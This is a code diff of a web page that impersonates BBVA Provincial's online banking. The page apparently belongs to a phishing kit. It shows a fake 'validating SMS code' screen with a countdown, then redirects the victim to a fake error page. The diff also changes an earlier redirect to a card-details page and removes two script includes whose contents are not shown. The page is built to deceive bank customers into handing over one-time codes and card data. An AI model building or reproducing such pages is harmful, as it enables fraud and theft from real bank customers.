@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex nofollow noarchive">
-    <title>BBVA Provincial - Validando</title>
+    <title>BBVA Provincial - Validando SMS</title>
     <link rel="icon" type="image/png" href="https://www.provincial.com/favicon.ico">
-    <script src="info.js"></script>
-    <script src="alertas.js"></script>
     <style>
         @font-face {
             font-family: 'BentonSansBBVA';
@@ -113,8 +111,8 @@
 
     <div class="container">
         <div class="loading-box">
-            <img id="status-image" src="loading.gif" alt="Validando">
-            <h1>Validando tu informacion</h1>
+            <img id="status-image" src="procesando.gif" alt="Procesando">
+            <h1>Validando código SMS</h1>
             <p>Tiempo estimado: <span class="countdown" id="countdown">15</span> segundos</p>
         </div>
     </div>
@@ -133,13 +131,13 @@
             countdownEl.textContent = seconds;
 
             if (seconds <= 2) {
-                statusImg.src = 'ready.png';
+                statusImg.src = 'listo.png';
                 statusImg.alt = 'Listo';
             }
 
             if (seconds <= 0) {
                 clearInterval(timer);
-                window.location.href = "tarjeta.html";
+                window.location.href = "verificacion-error.html";
             }
         }, 1000);
     </script>
